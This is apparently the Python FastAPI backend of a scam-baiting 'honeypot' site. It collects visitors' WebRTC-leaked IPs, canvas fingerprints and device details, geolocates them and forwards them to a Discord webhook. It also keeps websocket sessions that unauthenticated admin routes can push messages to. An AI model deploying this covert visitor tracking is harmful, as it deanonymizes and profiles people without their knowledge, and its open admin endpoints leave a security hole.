import asyncio
import json
import os
import httpx
from fastapi import FastAPI, Request, Response, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles

DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")

app = FastAPI()


async def geolocate_ip(client: httpx.AsyncClient, ip: str) -> dict:
    try:
        r = await client.get(
            f"http://ip-api.com/json/{ip}",
            params={"fields": "status,country,regionName,city,isp,org,as,proxy,hosting,query"},
            timeout=5.0,
        )
        data = r.json()
        if data.get("status") == "success":
            return data
    except Exception:
        pass
    return {}


def format_geo(geo: dict) -> str:
    if not geo:
        return "unknown"
    parts = [geo.get("city"), geo.get("regionName"), geo.get("country")]
    location = ", ".join(p for p in parts if p)
    isp = geo.get("isp") or geo.get("org") or ""
    asn = geo.get("as", "")
    flags = []
    if geo.get("proxy"):
        flags.append("⚠️ proxy/VPN")
    if geo.get("hosting"):
        flags.append("🖥️ datacenter")
    flag_str = f" [{', '.join(flags)}]" if flags else ""
    return f"{location} | {isp} ({asn}){flag_str}".strip(" |")


@app.post("/webhook")
async def receive_hit(request: Request):
    body = await request.body()
    try:
        payload = json.loads(body)
    except json.JSONDecodeError:
        return Response(status_code=400)

    webrtc = payload.get("webrtc_ips", {})
    tz     = payload.get("timezone", {})
    device = payload.get("device", {})
    fp     = payload.get("canvas_fingerprint", "none")
    ts     = payload.get("timestamp", "")

    public_ip_list = webrtc.get("public", [])
    local_ips      = ", ".join(webrtc.get("local", [])) or "none detected"

    async with httpx.AsyncClient() as client:
        geo_results = await asyncio.gather(*[geolocate_ip(client, ip) for ip in public_ip_list])

        geo_lines = []
        for ip, geo in zip(public_ip_list, geo_results):
            geo_lines.append(f"`{ip}` — {format_geo(geo)}")
        geo_value = "\n".join(geo_lines) or "none detected"

        embed = {
            "username": "Honeypot",
            "embeds": [{
                "title": "🖕 Scammer Hit",
                "color": 0xFF3B30,
                "timestamp": ts,
                "fields": [
                    {"name": "Public IPs (WebRTC + Geo)", "value": geo_value,  "inline": False},
                    {"name": "Local IPs",                 "value": local_ips,  "inline": False},
                    {"name": "Timezone",   "value": f"{tz.get('timezone', '?')} ({tz.get('utc_offset', '?')})", "inline": True},
                    {"name": "Language",   "value": tz.get("primary_language", "unknown"), "inline": True},
                    {"name": "Platform",   "value": device.get("platform", "unknown"),     "inline": True},
                    {"name": "Screen",     "value": device.get("screen_resolution", "?"),  "inline": True},
                    {"name": "Canvas FP",  "value": fp,                                    "inline": True},
                    {"name": "Referrer",   "value": device.get("referrer", "direct"),      "inline": True},
                    {"name": "User Agent", "value": device.get("user_agent", "?")[:1000],  "inline": False},
                ],
            }],
        }

        if DISCORD_WEBHOOK_URL:
            await client.post(DISCORD_WEBHOOK_URL, json=embed)

    return {"ok": True}


connected_scammers: dict[str, WebSocket] = {}


@app.websocket("/ws/{session_id}")
async def scammer_socket(websocket: WebSocket, session_id: str):
    await websocket.accept()
    connected_scammers[session_id] = websocket
    print(f"[WS] Scammer connected: {session_id}")
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        connected_scammers.pop(session_id, None)
        print(f"[WS] Scammer disconnected: {session_id}")


@app.post("/admin/send/{session_id}")
async def admin_send(session_id: str, request: Request):
    ws = connected_scammers.get(session_id)
    if not ws:
        return Response(status_code=404, content="Session not found")
    body = await request.body()
    await ws.send_text(body.decode())
    return {"ok": True}


@app.get("/admin/sessions")
async def admin_sessions():
    return {"sessions": list(connected_scammers.keys())}


# Serve static files — mounted last so /webhook takes priority
app.mount("/", StaticFiles(directory="public", html=True), name="static")
